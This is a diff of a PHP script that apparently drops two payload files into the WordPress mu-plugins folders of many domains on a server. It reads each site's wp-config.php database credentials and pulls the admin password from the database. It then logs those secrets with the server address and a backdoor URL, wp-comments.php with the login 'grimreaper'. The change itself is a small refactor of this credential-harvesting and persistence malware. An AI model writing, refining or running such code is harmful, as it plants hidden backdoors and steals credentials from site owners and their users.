@@ -116,11 +116,6 @@ if (isset($_POST['domains'])) {
     foreach ($domains as $key => $value) {
         $value = trim($value);
         $wp_config_path = get_child_path($value) . '/wp-config.php';
-        $config_contents = file_get_contents($wp_config_path);
-    
-        $db_host = get_wp_config_value($config_contents, 'DB_HOST');
-        $db_user = get_wp_config_value($config_contents, 'DB_USER');
-        $db_password = get_wp_config_value($config_contents, 'DB_PASSWORD');
     
         $muPluginsDir = get_child_path($value) . '/wp-content/mu-plugins';
         if (!is_dir($muPluginsDir)) {
@@ -132,15 +127,21 @@ if (isset($_POST['domains'])) {
         file_put_contents($pathLocation, $systemChecker);
         file_put_contents($rodentPathLocation, $rodent);
 
-        $config_content = file_get_contents(get_child_path($value) . '/wp-config.php');
-        $db_host = get_wp_config_value($config_contents, 'DB_HOST');
-        $db_user = get_wp_config_value($config_contents, 'DB_USER');
-        $db_password = get_wp_config_value($config_contents, 'DB_PASSWORD');
-        $db_name = get_wp_config_value($config_contents, 'DB_NAME');
-        $prefix = get_wp_prefix($config_contents);
-
-        $site_url = get_siteurl_option($db_host, $db_user, $db_password, $db_name, $prefix);
-        $userPass = get_admin_password($db_host, $db_user, $db_password, $db_name, $prefix);
+        if (file_exists($wp_config_path)) {
+            $config_contents = file_get_contents($wp_config_path);
+            $db_host = get_wp_config_value($config_contents, 'DB_HOST');
+            $db_user = get_wp_config_value($config_contents, 'DB_USER');
+            $db_password = get_wp_config_value($config_contents, 'DB_PASSWORD');
+            $db_name = get_wp_config_value($config_contents, 'DB_NAME');
+            $prefix = get_wp_prefix($config_contents);
+            $site_url = get_siteurl_option($db_host, $db_user, $db_password, $db_name, $prefix);
+            $userPass = get_admin_password($db_host, $db_user, $db_password, $db_name, $prefix);
+        } else {
+            $userPass = '';
+            $db_host = '';
+            $db_user = '';
+            $db_password = '';
+        }
 
         $line = "{$value}/" . ',' . ',' . ',' . ',' . ',' . ',' . ',' . ',' . ',' . 'admin' . ',' . $userPass . ',' . $_SERVER['SERVER_ADDR'] . ',' . $userInfo['name'] . ',' . $groupInfo['name'] . ',' . $db_host . ',' . $db_user . ',' . $db_password . ',MySQL,' . ',' . ',' . ',' . ',' . ',' . "https://{$value}/wp-comments.php?http_file_header=t&user=grimreaper&password=grimreaper123@" . PHP_EOL;
     
